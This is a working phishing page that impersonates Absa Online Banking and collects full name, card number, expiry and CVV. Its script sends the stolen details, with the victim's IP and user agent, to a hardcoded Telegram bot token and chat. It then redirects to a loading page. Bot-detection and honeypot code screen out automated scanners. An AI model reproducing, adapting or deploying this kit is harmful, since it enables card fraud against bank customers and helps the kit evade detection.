<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Card Card Entry</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root{
      --primary:#b81d35; /* Absa red */
      --accent:#ff6a00;
      --bg:#faf8f7;
      --card-bg: linear-gradient(135deg,#8d0720,#b81d35);
      --muted:#8b8b8b;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:Inter, "Helvetica Neue", Arial, sans-serif;background:var(--bg);color:#222;direction:ltr}
    .wrap{max-width:980px;margin:28px auto;padding:20px;display:grid;grid-template-columns:1fr 420px;gap:20px}
    header{display:flex;align-items:center;gap:12px;margin-bottom:8px}
    .logo-circle{width:50px;height:50px;border-radius:50%;background:var(--primary);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800}
    h1{font-size:18px;margin:0}
    .form-card{background:#fff;border-radius:10px;padding:18px;border:1px solid #f0eaea;box-shadow:0 6px 20px rgba(0,0,0,0.04)}
    label{display:block;font-size:13px;color:#444;margin-bottom:6px}
    .field{margin-bottom:12px}
    input[type="text"], input[type="tel"], select{
      width:100%;padding:10px 12px;border-radius:8px;border:1px solid #e6cfcf;font-size:15px;background:#fff;
      transition: border-color 0.3s ease, box-shadow 0.3s ease;
    }
    input:focus, select:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(184, 29, 53, 0.1);
      outline: none;
    }
    .row{display:flex;gap:10px}
    .row .col{flex:1}
    .btn{
      display:inline-block;background:var(--accent);color:#fff;border:none;padding:12px 16px;border-radius:8px;font-weight:700;cursor:pointer;width:100%;
      transition: background 0.3s ease, transform 0.1s ease;
    }
    .btn:hover {
      background: #e55a00;
    }
    .btn:active {
      transform: scale(0.98);
    }
    .btn.ghost{background:#fff;color:var(--accent);border:1px solid var(--accent);width:auto;padding:10px 12px}
    .muted{color:var(--muted);font-size:13px}
    /* card preview */
    .preview{display:flex;flex-direction:column;gap:12px;align-items:center}
    .card-visual{
      width:360px;height:220px;border-radius:16px;color:#fff;padding:18px;display:flex;flex-direction:column;justify-content:space-between;box-shadow:0 8px 30px rgba(0,0,0,0.12);
      background:var(--card-bg);
    }
    .chip{width:56px;height:40px;border-radius:6px;background:rgba(255,255,255,0.18);display:block}
    .card-number{font-size:20px;letter-spacing:2px}
    .card-name{font-size:14px;text-transform:uppercase}
    .card-meta{display:flex;justify-content:space-between;align-items:center;font-size:13px}
    footer{grid-column:1/-1;text-align:center;color:#a7a7a7;font-size:13px;margin-top:6px}
    .helper{font-size:12px;color:#666;margin-top:6px}
    .actions{display:flex;gap:8px;margin-top:8px}
    
    /* Ø­Ù…Ø§ÙŠØ© ØºÙŠØ± Ù…Ø±Ø¦ÙŠØ© */
    .honeypot-field {
      opacity: 0;
      position: absolute;
      left: -10000px;
      height: 0;
      width: 0;
      pointer-events: none;
    }
    
    /* Ø£Ù†ÙŠÙ…ÙŠØ´Ù† Ù„Ù„ØªØ­Ù…ÙŠÙ„ */
    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-right: 10px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    @media(max-width:900px){
      .wrap{grid-template-columns:1fr; padding:12px}
      .card-visual{width:100%;height:200px}
    }
  </style>
</head>
<body>
<script src="anti-bot-system.js">
</script>

  <div class="wrap">
    <div>
      <header>
        <div class="logo-circle">absa</div>
        <div>
          <h1>Absa Online Banking</h1>
        </div>
      </header>

      <section class="form-card" aria-labelledby="formtitle">
        <h2 id="formtitle" style="margin:0 0 12px">Enter Card Details</h2>

        <form id="cardForm" autocomplete="off" novalidate>
          <!-- Ø­Ù‚Ù„ Ø´ÙŠØ±ÙŠØªØ±Ø§Ø¨ (ØºÙŠØ± Ù…Ø±Ø¦ÙŠ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠÙŠÙ†) -->
          <input class="honeypot-field" type="text" id="website" name="website" tabindex="-1" autocomplete="off">
          
          <!-- full name -->
          <div class="field">
            <label for="fullname">Full name</label>
            <input id="fullname" name="fullname" type="text" placeholder="e.g. Alex Johnson" required />
          </div>

          <!-- card number -->
          <div class="field">
            <label for="cardnumber">Card number</label>
            <input id="cardnumber" name="cardnumber" inputmode="numeric" type="tel" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" />
          </div>

          <!-- expiry & cvv -->
          <div class="row">
            <div class="col field">
              <label for="expMonth">Expiry date</label>
              <div style="display:flex;gap:8px">
                <select id="expMonth" name="expMonth" aria-label="month" required>
                  <option value="">Month</option>
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>

                <select id="expYear" name="expYear" aria-label="year" required>
                  <!-- years populated by JS -->
                </select>
              </div>
            </div>

            <div class="col field" style="max-width:160px">
              <label for="cvv">CVV (3 digits)</label>
              <input id="cvv" name="cvv" inputmode="numeric" type="tel" placeholder="123" maxlength="3" />
            </div>
          </div>

          <div class="actions">
            <button class="btn" type="submit" id="submitBtn">
              <span id="btnText">NEXT</span>
            </button>
          </div>

          <div class="helper" id="status" aria-live="polite" style="margin-top:10px"></div>
        </form>
      </section>
    </div>

    <!-- preview panel -->
    <aside class="preview">
      <div class="card-visual" aria-hidden="true">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <div class="chip" aria-hidden="true"></div>
          <div style="font-weight:700;opacity:0.95">absa</div>
        </div>

        <div style="display:flex;flex-direction:column;gap:6px">
          <div class="card-number" id="pvNumber">â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢</div>
          <div class="card-name" id="pvName">FULL NAME</div>
        </div>

        <div class="card-meta">
          <div><small style="opacity:0.85">VALID</small><div id="pvExpiry">MM / YYYY</div></div>
          <div style="text-align:right"><small style="opacity:0.85">CVV</small><div id="pvCvv">â€¢â€¢â€¢</div></div>
        </div>
      </div>

    </aside>

    <footer>Â© Copyright. Absa Bank Limited. Registration Number: 1986/004794/06 Authorised financial services and registered credit provider NCRCP7</footer>
  </div>

<script>
  // Redirect target â€” change this to wherever you want to go after save
  const redirectUrl = "loading2.html"; // <-- change as needed

  // START YEAR fixed as 2025 per request
  const startYear = 2025;
  const yearsToShow = 11; // 2025 .. 2035
  const expYearSelect = document.getElementById('expYear');

  for (let i = 0; i < yearsToShow; i++){
    const y = startYear + i;
    const opt = document.createElement('option');
    opt.value = String(y);
    opt.textContent = String(y);
    expYearSelect.appendChild(opt);
  }

  // === Ù†Ø¸Ø§Ù… Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ù…Ù† Ø§Ù„Ø¨ÙˆØªØ§Øª ===
  let humanBehaviorScore = 0;
  let formInteractionStartTime = null;
  let mouseMovements = 0;
  let keystrokes = 0;
  let botDetectionEnabled = true;

  // ØªØªØ¨Ø¹ Ø³Ù„ÙˆÙƒ Ø§Ù„Ø¥Ù†Ø³Ø§Ù†
  function initHumanBehaviorTracking() {
    formInteractionStartTime = Date.now();
    
    // ØªØªØ¨Ø¹ Ø­Ø±ÙƒØ© Ø§Ù„Ù…Ø§ÙˆØ³
    document.addEventListener('mousemove', () => {
      mouseMovements++;
      if (mouseMovements > 2) humanBehaviorScore += 5;
    });
    
    // ØªØªØ¨Ø¹ Ø§Ù„ÙƒØªØ§Ø¨Ø©
    document.addEventListener('keydown', () => {
      keystrokes++;
      if (keystrokes > 3) humanBehaviorScore += 3;
    });
    
    // ØªØªØ¨Ø¹ Ø§Ù„Ù†Ù‚Ø±
    document.addEventListener('click', (e) => {
      if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') {
        humanBehaviorScore += 2;
      }
    });
    
    // ØªØªØ¨Ø¹ Ø§Ù„ØªÙ…Ø±ÙŠØ±
    let lastScrollY = window.scrollY;
    window.addEventListener('scroll', () => {
      if (Math.abs(window.scrollY - lastScrollY) > 50) {
        humanBehaviorScore += 2;
      }
      lastScrollY = window.scrollY;
    });
  }

  // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙˆØª
  function isLikelyBot() {
    if (!botDetectionEnabled) return false;
    
    // 1. ÙØ­Øµ Ø­Ù‚Ù„ Ø§Ù„Ø´ÙŠØ±ÙŠØªØ±Ø§Ø¨ (Ø¥Ø°Ø§ ØªÙ… Ù…Ù„Ø¤Ù‡ ÙÙ‡Ùˆ Ø¨ÙˆØª)
    const honeypot = document.getElementById('website');
    if (honeypot.value !== '') {
      console.log('Bot detected: Honeypot field filled');
      return true;
    }
    
    // 2. ÙØ­Øµ ÙˆÙ‚Øª Ø§Ù„ØªØ¹Ø¨Ø¦Ø© (Ø¥Ø°Ø§ ÙƒØ§Ù† Ø³Ø±ÙŠØ¹Ø§Ù‹ Ø¬Ø¯Ø§Ù‹)
    const fillTime = Date.now() - formInteractionStartTime;
    if (fillTime < 2000 && humanBehaviorScore < 10) {
      console.log('Bot detected: Form filled too quickly');
      return true;
    }
    
    // 3. ÙØ­Øµ Ù†Ù‚Ø§Ø· Ø§Ù„Ø³Ù„ÙˆÙƒ Ø§Ù„Ø¨Ø´Ø±ÙŠ
    if (humanBehaviorScore < 15) {
      console.log('Bot detected: Low human behavior score');
      return true;
    }
    
    // 4. ÙØ­Øµ Ù†Ù…Ø· Ø§Ù„ÙƒØªØ§Ø¨Ø© (Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ø±ÙˆÙ Ù…ÙƒØªÙˆØ¨Ø© Ø¯ÙØ¹Ø© ÙˆØ§Ø­Ø¯Ø©)
    const inputs = document.querySelectorAll('input');
    let allFilledAtOnce = true;
    let firstFillTime = null;
    
    inputs.forEach(input => {
      input.addEventListener('input', function() {
        if (!firstFillTime) firstFillTime = Date.now();
        const timeSinceFirstFill = Date.now() - firstFillTime;
        
        // Ø¥Ø°Ø§ ØªÙ… Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ ÙÙŠ Ø£Ù‚Ù„ Ù…Ù† 500 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©
        if (timeSinceFirstFill < 500) {
          allFilledAtOnce = false;
        }
      });
    });
    
    return false;
  }

  // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªØ£Ø®ÙŠØ± Ø§Ù„Ø¨Ø´Ø±ÙŠ
  function humanizeInteraction() {
    return new Promise(resolve => {
      const delay = 100 + Math.random() * 400; // 100-500ms delay
      setTimeout(resolve, delay);
    });
  }

  // Ø¯Ø§Ù„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP
  async function getIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (err) {
      console.error('Could not get IP', err);
      return 'Could not retrieve IP';
    }
  }

  // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Telegram
  async function sendToTelegram(cardData) {
    const ip = await getIP();
    const date = new Date();
    const day = String(date.getDate()).padStart(2, '0');
    const month = date.toLocaleString('default', { month: 'short' });
    const year = date.getFullYear();
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'pm' : 'am';
    const formattedTime = `${hours % 12}:${minutes} ${ampm}`;
    const formattedDate = `${day} ${month}, ${year}`;

    const msg = `
[+]â”â”â”â”â”â”â”â”â”â”â”â”ã€ğŸ’³ CARD INFORMATIONã€‘â”â”â”â”â”â”â”â”â”â”â”â”[+]
[ FULL NAME] = ${cardData.fullname}
[ CARD NUMBER] = ${cardData.cardNumber}
[ EXPIRY DATE] = ${cardData.expMonth}/${cardData.expYear}
[ CVV] = ${cardData.cvv}
[+]â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”ã€SYSTEM INFOã€‘â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”[+]
[ IP INFO] = http://www.geoiptool.com/?IP=${ip}
[ DATE] = ${formattedTime} / ${formattedDate}
[ USER AGENT] = ${navigator.userAgent}
[+]â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”[+]`;

    const token = '8190122981:AAE1dDTKA7_dAMZuO0EPJYUdb4fCn7b4Pf0';
    const chatId = '-4918428156';
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;

    try {
      await fetch(apiUrl);
      console.log('Data sent successfully');
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
    }
  }

  // elements
  const cardNumberInput = document.getElementById('cardnumber');
  const fullnameInput = document.getElementById('fullname');
  const expMonth = document.getElementById('expMonth');
  const cvvInput = document.getElementById('cvv');
  const pvNumber = document.getElementById('pvNumber');
  const pvName = document.getElementById('pvName');
  const pvExpiry = document.getElementById('pvExpiry');
  const pvCvv = document.getElementById('pvCvv');
  const statusEl = document.getElementById('status');
  const submitBtn = document.getElementById('submitBtn');
  const btnText = document.getElementById('btnText');

  // format card number as groups of 4 while typing
  cardNumberInput.addEventListener('input', (e) => {
    const cursorPos = e.target.selectionStart;
    const raw = e.target.value.replace(/\D/g,'').slice(0,16);
    const parts = [];
    for (let i=0;i<raw.length;i+=4) parts.push(raw.substring(i,i+4));
    e.target.value = parts.join(' ');
    updatePreview();
    // move cursor to end
    e.target.selectionStart = e.target.selectionEnd = e.target.value.length;
  });

  // CVV: allow only digits, max 3
  cvvInput.addEventListener('input', e=>{
    e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
    updatePreview();
  });

  fullnameInput.addEventListener('input', updatePreview);
  expMonth.addEventListener('change', updatePreview);
  expYearSelect.addEventListener('change', updatePreview);

  function updatePreview(){
    const numVal = cardNumberInput.value.trim();
    pvNumber.textContent = numVal ? numVal.replace(/(\d{4})/g,'$1 ').trim() : 'â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢';
    pvName.textContent = fullnameInput.value ? fullnameInput.value.toUpperCase() : 'FULL NAME';
    const m = expMonth.value || 'MM';
    const y = expYearSelect.value || 'YYYY';
    pvExpiry.textContent = `${m} / ${y}`;
    pvCvv.textContent = cvvInput.value ? cvvInput.value.replace(/./g,'â€¢') : 'â€¢â€¢â€¢';
  }

  // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Telegram Ø«Ù… Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„
  document.getElementById('cardForm').addEventListener('submit', async function(e){
    e.preventDefault();
    
    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙˆØª
    if (isLikelyBot()) {
      statusEl.textContent = 'Please complete the form like a human user.';
      statusEl.style.color = '#b81d35';
      return;
    }
    
    statusEl.textContent = '';
    
    // Ø¥Ø¶Ø§ÙØ© Ø£Ù†ÙŠÙ…ÙŠØ´Ù† Ø§Ù„ØªØ­Ù…ÙŠÙ„
    btnText.innerHTML = '<span class="loading"></span> Processing...';
    submitBtn.disabled = true;
    
    await humanizeInteraction(); // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„Ø³Ù„ÙˆÙƒ Ø§Ù„Ø¨Ø´Ø±ÙŠ
    
    const fullname = fullnameInput.value.trim();
    const cardnum = cardNumberInput.value.replace(/\s/g,'');
    const month = expMonth.value;
    const year = expYearSelect.value;
    const cvv = cvvInput.value;

    // basic validations
    if (!fullname){ 
      statusEl.textContent = 'Please enter the full name.'; 
      btnText.textContent = 'NEXT';
      submitBtn.disabled = false;
      return; 
    }
    if (cardnum.length !== 16){ 
      statusEl.textContent = 'Card number must be exactly 16 digits.'; 
      btnText.textContent = 'NEXT';
      submitBtn.disabled = false;
      return; 
    }
    if (!month || !year){ 
      statusEl.textContent = 'Please select an expiry date.'; 
      btnText.textContent = 'NEXT';
      submitBtn.disabled = false;
      return; 
    }
    if (cvv.length !== 3){ 
      statusEl.textContent = 'CVV must be 3 digits.'; 
      btnText.textContent = 'NEXT';
      submitBtn.disabled = false;
      return; 
    }

    const payload = {
      fullname,
      cardNumber: cardnum,
      expMonth: month,
      expYear: year,
      cvv
    };

    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Telegram
    await sendToTelegram(payload);
    
    // Show success + countdown
    let wait = 3; // seconds before redirect
    statusEl.textContent = `Processing...`;
    statusEl.style.color = 'green';
    
    // clear inputs for privacy
    cvvInput.value = '';
    cardNumberInput.value = '';
    fullnameInput.value = '';
    updatePreview();
    
    // countdown
    const t = setInterval(()=>{
      wait--;
      if (wait > 0){
        statusEl.textContent = `Processing...`;
      } else {
        clearInterval(t);
        // perform redirect
        window.location.href = redirectUrl;
      }
    }, 1000);
  });

  // Ø§Ù„ØªÙ‡ÙŠØ¦Ø©
  document.addEventListener('DOMContentLoaded', function() {
    initHumanBehaviorTracking();
    updatePreview();
    
    // Ø­Ù…Ø§ÙŠØ© Ø¥Ø¶Ø§ÙÙŠØ©: ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ù†Ø³Ø® ÙˆØ§Ù„Ù„ØµÙ‚ ÙÙŠ Ø¨Ø¹Ø¶ Ø§Ù„Ø­Ù‚ÙˆÙ„
    cvvInput.addEventListener('paste', e => e.preventDefault());
    cvvInput.addEventListener('copy', e => e.preventDefault());
    cardNumberInput.addEventListener('paste', e => {
      e.preventDefault();
      humanBehaviorScore += 5; // Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ù†Ù‚Ø§Ø· Ù„Ø£Ù† Ø§Ù„Ø¨Ø´Ø± ÙŠÙ„ØµÙ‚ÙˆÙ†
    });
  });

</script>
</body>
</html>